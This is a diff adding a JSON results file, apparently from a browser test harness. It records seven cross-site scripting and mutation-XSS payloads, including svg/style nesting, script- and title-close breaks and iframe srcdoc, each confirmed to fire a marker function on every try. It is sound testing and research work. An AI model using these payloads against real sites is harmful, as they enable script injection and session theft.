@@ -1,0 +1,124 @@
+{
+ "tries": 3,
+ "rows": [
+  {
+   "row": "mxss-svg-p-style/select",
+   "document": "<html><body><select><option><svg></p><style><a id=\"</style><img src=x onerror=__x()>\"></option></select></body></html>",
+   "settle": 300,
+   "parser": [
+    true,
+    true,
+    true
+   ],
+   "sink": [
+    true,
+    true,
+    true
+   ],
+   "parser_stable": true,
+   "sink_stable": true
+  },
+  {
+   "row": "title-close-break/text",
+   "document": "<html><body><div></title><img src=x onerror=__x()></div></body></html>",
+   "settle": 300,
+   "parser": [
+    true,
+    true,
+    true
+   ],
+   "sink": [
+    true,
+    true,
+    true
+   ],
+   "parser_stable": true,
+   "sink_stable": true
+  },
+  {
+   "row": "iframe-srcdoc/table_td",
+   "document": "<html><body><table><tr><td><iframe srcdoc=\"&lt;img src=x onerror=top.__x()&gt;\"></iframe></td></tr></table></body></html>",
+   "settle": 300,
+   "parser": [
+    true,
+    true,
+    true
+   ],
+   "sink": [
+    true,
+    true,
+    true
+   ],
+   "parser_stable": true,
+   "sink_stable": true
+  },
+  {
+   "row": "script-close-break/table_td",
+   "document": "<html><body><table><tr><td>';</script><img src=x onerror=__x()></td></tr></table></body></html>",
+   "settle": 300,
+   "parser": [
+    true,
+    true,
+    true
+   ],
+   "sink": [
+    true,
+    true,
+    true
+   ],
+   "parser_stable": true,
+   "sink_stable": true
+  },
+  {
+   "row": "img-onerror/text",
+   "document": "<html><body><div><img src=x onerror=__x()></div></body></html>",
+   "settle": 300,
+   "parser": [
+    true,
+    true,
+    true
+   ],
+   "sink": [
+    true,
+    true,
+    true
+   ],
+   "parser_stable": true,
+   "sink_stable": true
+  },
+  {
+   "row": "mxss-body-br/svg_style",
+   "document": "<html><body><svg><style><svg><p><body><img src=x onerror=__x()></style></svg></body></html>",
+   "settle": 300,
+   "parser": [
+    true,
+    true,
+    true
+   ],
+   "sink": [
+    true,
+    true,
+    true
+   ],
+   "parser_stable": true,
+   "sink_stable": true
+  },
+  {
+   "row": "iframe-srcdoc/select",
+   "document": "<html><body><select><option><iframe srcdoc=\"&lt;img src=x onerror=top.__x()&gt;\"></iframe></option></select></body></html>",
+   "settle": 300,
+   "parser": [
+    true,
+    true,
+    true
+   ],
+   "sink": [
+    true,
+    true,
+    true
+   ],
+   "parser_stable": true,
+   "sink_stable": true
+  }
+ ]
+}
